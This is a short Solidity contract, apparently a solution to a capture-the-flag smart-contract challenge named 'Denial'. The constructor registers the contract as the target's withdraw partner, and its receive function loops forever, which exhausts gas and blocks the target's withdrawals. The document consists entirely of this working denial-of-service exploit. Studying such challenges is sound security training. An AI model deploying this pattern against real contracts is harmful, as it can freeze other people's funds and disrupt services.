contract DenialHack {

    constructor(address _address) {
        Denial denial = Denial(payable(_address));
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        while (true) {}
    }
}